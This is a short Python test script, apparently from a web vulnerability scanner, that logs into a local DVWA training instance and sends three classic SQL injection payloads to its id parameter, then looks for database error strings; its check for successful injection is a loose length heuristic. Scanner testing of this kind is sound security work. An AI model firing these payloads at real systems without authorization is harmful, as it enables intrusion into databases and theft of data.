#!/usr/bin/env python3

import sys
sys.path.append('.')

from core.crawler import WebCrawler
from core.request_handler import RequestHandler

# Test SQL injection payloads directly against DVWA
url = "http://localhost:45/vulnerabilities/sqli/?id=1&Submit=Submit#"
crawler = WebCrawler(url, username='admin', password='password')
pages = crawler.crawl()

if pages:
    page = pages[0]
    params = page['params']
    print(f"Testing URL: {page['url']}")
    print(f"Parameters: {params}")
    
    # Test with RequestHandler directly
    handler = RequestHandler()
    
    # Test SQL injection payloads
    payloads = ["'", "' OR '1'='1", "1' UNION SELECT null--"]
    
    for payload in payloads:
        print(f"\n--- Testing payload: {payload} ---")
        
        # Test URL parameter
        test_params = params.copy()
        test_params['id'] = payload
        
        response = handler.get(page['url'], params=test_params)
        print(f"Status: {response.status_code}")
        
        # Check for SQL errors
        content = response.text.lower()
        sql_errors = [
            "sql syntax", "mysql_fetch", "mysql_num_rows", 
            "ora-", "microsoft ole db", "odbc drivers error",
            "postgresql", "sqlite", "you have an error in your sql syntax"
        ]
        
        found_error = False
        for error in sql_errors:
            if error in content:
                print(f"✅ FOUND SQL ERROR: {error}")
                found_error = True
                break
        
        if not found_error:
            print("No SQL error detected")
            
        # Also check if content changed (indicates successful injection)
        if len(content) > 100:  # DVWA normally returns different content for successful injection
            print("Content length changed - possible successful injection")
else:
    print("No pages found!")
